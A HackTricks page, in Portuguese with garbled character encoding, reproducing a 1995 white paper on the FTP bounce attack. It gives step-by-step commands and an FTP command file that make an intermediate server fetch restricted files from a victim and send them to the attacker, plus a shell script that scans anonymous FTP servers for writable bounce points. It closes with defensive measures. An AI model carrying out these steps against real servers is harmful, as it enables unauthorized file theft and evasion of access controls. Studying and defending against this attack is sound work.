<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma empresa de ciberseguran√ßa? Voc√™ quer ver sua empresa anunciada no HackTricks? ou voc√™ quer ter acesso √† vers√£o mais recente do PEASS ou baixar o HackTricks em PDF? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Resumo

Se voc√™ tiver acesso a um servidor FTP de salto, poder√° fazer com que ele solicite arquivos de outro servidor FTP \(onde voc√™ conhece algumas credenciais\) e baixe esse arquivo para seu pr√≥prio servidor.

## Requisitos

Credenciais FTP v√°lidas no servidor FTP intermedi√°rio  
Credenciais FTP v√°lidas no servidor FTP da v√≠tima  
Ambos os servidores aceitam o comando PORT \(ataque de salto FTP\)  
Voc√™ pode escrever dentro de algum diret√≥rio do servidor FTP intermedi√°rio  
O servidor intermedi√°rio ter√° mais acesso dentro do servidor FTP da v√≠tima do que voc√™ por algum motivo \(√© isso que voc√™ vai explorar\)

## Passos

1. Conecte-se ao seu pr√≥prio servidor FTP e torne a conex√£o passiva \(comando pasv\) para faz√™-lo ouvir em um diret√≥rio onde o servi√ßo da v√≠tima enviar√° o arquivo
2. Fa√ßa o arquivo que vai enviar o servidor FTP intermedi√°rio para o servidor da v√≠tima \(o exploit\). Este arquivo ser√° um texto simples dos comandos necess√°rios para autenticar-se no servidor da v√≠tima, mudar o diret√≥rio e baixar um arquivo para seu pr√≥prio servidor.
3. Conecte-se ao servidor FTP intermedi√°rio e fa√ßa o upload do arquivo anterior
4. Fa√ßa o servidor FTP intermedi√°rio estabelecer uma conex√£o com o servidor da v√≠tima e enviar o arquivo de explora√ß√£o
5. Capture o arquivo em seu pr√≥prio servidor FTP
6. Exclua o arquivo de explora√ß√£o do servidor FTP intermedi√°rio

Todas as informa√ß√µes neste post foram extra√≠das de: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# O Ataque de Salto FTP

Este artigo discute um dos muitos poss√≠veis usos do "ataque de salto do servidor FTP". O mecanismo usado √© provavelmente bem conhecido, mas at√© o momento o interesse em detalh√°-lo ou corrigi-lo parece ser baixo ou inexistente. Este exemplo em particular demonstra mais uma maneira pela qual a maioria das "restri√ß√µes de exporta√ß√£o" eletronicamente impostas s√£o completamente in√∫teis e triviais de contornar. √â escolhido em um esfor√ßo para fazer o leitor se sentar e perceber que existem alguns aspectos realmente mal concebidos do protocolo FTP padr√£o.

Agradecimentos tamb√©m a Alain Knaff em imag.fr por uma discuss√£o breve, mas divertida, de algumas dessas quest√µes h√° alguns meses, que me fez pensar mais profundamente sobre elas.

## O motivo

Voc√™ √© um usu√°rio em foreign.fr, endere√ßo IP F.F.F.F, e deseja recuperar o c√≥digo-fonte criptogr√°fico de crypto.com nos EUA. O servidor FTP em crypto.com est√° configurado para permitir sua conex√£o, mas negar o acesso √†s fontes criptogr√°ficas porque seu endere√ßo IP de origem √© o de um site n√£o americano \[t√£o pr√≥ximo quanto seu servidor FTP pode determinar a partir do DNS, isto √©\]. Em qualquer caso, voc√™ n√£o pode recuperar diretamente o que deseja do servidor crypto.com.

No entanto, crypto.com permitir√° que ufred.edu baixe as fontes criptogr√°ficas porque ufred.edu tamb√©m est√° nos EUA. Voc√™ sabe que /incoming em ufred.edu √© um diret√≥rio de grava√ß√£o mundial que qualquer usu√°rio an√¥nimo pode colocar arquivos e l√™-los de volta. O endere√ßo IP de crypto.com √© C.C.C.C.

## O ataque

Isso pressup√µe que voc√™ tenha um servidor FTP que fa√ßa o modo passivo. Abra uma conex√£o FTP para o endere√ßo IP real de sua pr√≥pria m√°quina \[n√£o localhost\] e fa√ßa login. Mude para um diret√≥rio conveniente que voc√™ tenha acesso de grava√ß√£o e, em seguida, fa√ßa:
```text
pasv
stor foobar
```
Fa√ßa uma nota do endere√ßo e porta que s√£o retornados pelo comando PASV, F,F,F,F,X,X. Esta sess√£o FTP agora ficar√° pendurada, ent√£o coloque-a em segundo plano ou mude para outra janela ou algo assim para prosseguir com o restante deste processo.

Construa um arquivo contendo comandos do servidor FTP. Vamos cham√°-lo de "`instrs`". Ele ter√° a seguinte apar√™ncia:
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
F,F,F,F,X,X √© o mesmo endere√ßo e porta que sua pr√≥pria m√°quina lhe entregou na primeira conex√£o. O lixo no final s√£o linhas extras que voc√™ cria, cada uma contendo 250 NULLS e nada mais, o suficiente para preencher cerca de 60K de dados extras. A raz√£o para esse preenchimento ser√° explicada posteriormente.

Abra uma conex√£o FTP com ufred.edu, fa√ßa login anonimamente e acesse /incoming. Agora digite o seguinte nesta sess√£o FTP, que transfere uma c√≥pia do seu arquivo "`instrs`" e, em seguida, diz ao servidor FTP de ufred.edu para se conectar ao servidor FTP de crypto.com usando seu arquivo como comandos:
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` deve agora aparecer como "`foobar`" em sua m√°quina atrav√©s da sua primeira conex√£o FTP. Se a conex√£o com ufred.edu n√£o morreu sozinha devido a um bug comum do servidor, limpe excluindo "`instrs`" e saia. Caso contr√°rio, voc√™ ter√° que se reconectar para terminar.

## Discuss√£o

Existem v√°rias variantes disso. Sua conex√£o de ouvinte PASV pode ser aberta em qualquer m√°quina que voc√™ tenha acesso de grava√ß√£o de arquivos - a sua pr√≥pria, outra conex√£o com ufred.edu ou em algum lugar completamente diferente. Na verdade, nem mesmo precisa ser um servidor FTP - qualquer utilit√°rio que ou√ßa em uma porta TCP conhecida e leia dados brutos dele em um arquivo servir√°. Uma conex√£o de dados FTP em modo passivo √© simplesmente uma maneira conveniente de fazer isso.

Os nulos extras no final do arquivo de comando s√£o para preencher as janelas TCP em ambas as extremidades da conex√£o ufred -&gt; crypto e garantir que a conex√£o de comando permane√ßa aberta tempo suficiente para que toda a sess√£o seja executada. Caso contr√°rio, a maioria dos servidores FTP tende a abortar todas as transfer√™ncias e processamento de comandos quando a conex√£o de controle √© encerrada prematuramente. O tamanho dos dados √© suficiente para preencher as janelas de recebimento e transmiss√£o, que em alguns sistemas operacionais s√£o bastante grandes \[na ordem de 30K\]. Voc√™ pode reduzir isso se souber quais sistemas operacionais est√£o em cada extremidade e a soma de seus tamanhos de janela TCP padr√£o. Ele √© dividido em linhas de 250 caracteres para evitar a sobrecarga de buffers de comando no servidor de destino - provavelmente acad√™mico, j√° que voc√™ j√° disse ao servidor para sair.

Se crypto.com proibir \*qualquer\* conex√£o de cliente FTP de voc√™ em foreign.fr e voc√™ precisar ver quais arquivos est√£o onde, sempre poder√° colocar "`list -aR`" em seu arquivo de comando e obter uma lista de diret√≥rios de toda a √°rvore via ufred.

Voc√™ pode ter que recuperar seu arquivo de comando para o servidor FTP de destino no modo ASCII em vez do modo bin√°rio. Alguns servidores FTP podem lidar com novas linhas brutas, mas outros podem precisar que as linhas de comando sejam terminadas por pares CRLF. Lembre-se disso ao recuperar arquivos para daemons que n√£o sejam servidores FTP, tamb√©m.

## Outras possibilidades

Apesar do fato de que essas conex√µes de terceiros s√£o unidirecionais, elas podem ser usadas para todo tipo de coisas. M√©todos semelhantes podem ser usados para postar correio e not√≠cias virtualmente n√£o rastre√°veis, atacar servidores em v√°rios sites, encher discos, tentar pular firewalls e, em geral, ser irritante e dif√≠cil de rastrear ao mesmo tempo. Um pouco de reflex√£o trar√° a realiza√ß√£o de in√∫meras outras possibilidades assustadoras.

As conex√µes lan√ßadas dessa maneira v√™m da porta de origem 20, que alguns sites permitem atrav√©s de seus firewalls na tentativa de lidar com o problema "ftp-data". Para alguns prop√≥sitos, isso pode ser a pr√≥xima melhor coisa para ataques com roteamento de origem e provavelmente ter√° sucesso onde o roteamento de origem falha contra filtros de pacotes. E tudo isso √© poss√≠vel pela maneira como a especifica√ß√£o do protocolo FTP foi escrita, permitindo que as conex√µes de controle venham de qualquer lugar e as conex√µes de dados v√£o para qualquer lugar.

## Defesas

Sempre haver√° sites na rede com servidores FTP antigos e diret√≥rios grav√°veis que permitem esse tipo de tr√°fego, ent√£o dizer "corrija todos os servidores FTP" √© a resposta errada. Mas voc√™ pode proteger o seu pr√≥prio contra ser um ponto de salto de terceiros e ter outro usado contra voc√™.

A primeira coisa √≥bvia a fazer √© permitir que um servidor FTP fa√ßa apenas conex√µes de dados para o mesmo host de onde a conex√£o de controle se originou. Isso n√£o impede o ataque acima, √© claro, j√° que o ouvinte PASV tamb√©m pode estar em ufred.edu e, portanto, atender a esse requisito, mas impede que o seu site seja um ponto de salto potencial. Tamb√©m quebra o conceito de "FTP proxy", mas escondido em algum lugar deste par√°grafo h√° um violino muito pequeno.

A pr√≥xima coisa √≥bvia √© proibir conex√µes de controle FTP que venham de portas reservadas, ou pelo menos da porta 20. Isso impede o cen√°rio acima conforme declarado.

Ambas as coisas, al√©m da usual sujeira sobre bloquear pacotes com roteamento de origem e outras vias de falsifica√ß√£o, s√£o necess√°rias para evitar hacks desse tipo. E pense se voc√™ realmente precisa de um diret√≥rio "de entrada" aberto.

Permitir apenas conex√µes de dados de clientes em modo passivo √© outra possibilidade, mas ainda existem muitos clientes FTP em uso que n√£o s√£o passivos.

## "Um consenso solto e c√≥digo em execu√ß√£o"

Existe algum trabalho existente abordando isso dispon√≠vel aqui em avian.org \[e est√° h√° v√°rios meses, devo acrescentar\] no "[arquivo de corre√ß√µes](ftp://ftp.avian.org:/src/fixkits/)". V√°rias modifica√ß√µes para wu-ftpd-2.4 s√£o apresentadas, o que inclui c√≥digo para impedir e registrar tentativas de usar comandos PORT falsos. Corre√ß√µes de seguran√ßa recentes de outros lugares tamb√©m est√£o inclu√≠das, juntamente com suporte s/key e v√°rias op√ß√µes de tempo de compila√ß√£o para refor√ßar a seguran√ßa para aplicativos espec√≠ficos.

Stan Barber em academ.com est√° trabalhando na fus√£o dessas e v√°rias outras corre√ß√µes em um verdadeiro lan√ßamento atualizado do wu-ftpd. Existem alguns outros esfor√ßos divergentes em andamento. Em nenhum lugar √© afirmado que todo esse trabalho est√° completo ainda, mas √© um come√ßo para algo que eu tinha em mente h√° algum tempo - um lan√ßamento em toda a rede do wu-ftpd-2.5, com contribui√ß√µes de todo o mundo. O servidor wu-ftpd se tornou muito popular, mas precisa de mais uma atualiza√ß√£o de seguran√ßa. Seria bom reunir todas as melhorias em um s√≥ lugar coordenado, e parece que isso vai acontecer. Tudo isso ainda n√£o ajudar√° as pessoas que insistem em executar servidores fornecidos pelo fornecedor, √© claro.

A verifica√ß√£o de sanidade da porta de origem da conex√£o do cliente n√£o √© implementada especificamente nas corre√ß√µes do servidor FTP, mas em modifica√ß√µes no pacote tcp-wrappers de Wietse, j√° que esse problema √© mais geral. Uma op√ß√£o simples de PORT √© adicionada que nega conex√µes de intervalos configur√°veis de portas de origem no est√°gio tcpd, antes que um daemon chamado seja executado.

Algumas dessas informa√ß√µes s√£o apontadas por [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) na √°rea FTP an√¥nima aqui. Leia este roteiro antes de pegar outras coisas.

## Notas

Adicionar os nulos no final do arquivo de comando foi a chave para fazer isso funcionar contra uma variedade de daemons. Simplesmente enviar os dados desejados geralmente falharia devido ao fechamento imediato sinalizando o daemon para sair.

Se a WUSTL n√£o desistiu completamente do projeto wu-ftpd, eles est√£o mantendo-se muito quietos sobre o trabalho futuro. Bryan O'Connor parece ter muitos outros projetos para atender agora...

Este √© um script trivial para encontrar diret√≥rios e arquivos de propriedade do ftp e grav√°veis pelo mundo em um servidor FTP an√¥nimo baseado em Unix. Voc√™ ficaria surpreso com quantos desses "bouncepoints" grav√°veis aparecem ap√≥s uma curta execu√ß√£o de algo assim. Voc√™ ter√° que verificar posteriormente se pode colocar e obter arquivos de tais locais; alguns servidores protegem os arquivos enviados contra leitura. Muitos n√£o o fazem e depois se perguntam por que est√£o entre os dez principais sites de warez desta semana...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
  BEGIN { idir = "/" ; dirp = 0 }
  /.:$/ { idir = $0 ; dirp = 1 ; }
  /^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
    if (dirp == 1) print idir
    dirp = 0
    print $0
  } '
rm xxx.$$
```
Suponho que se possa chamar isso de white paper. Est√° dispon√≠vel em avian.org em [/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack) e tamb√©m foi postado em v√°rios lugares relevantes. \_H\* 950712



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
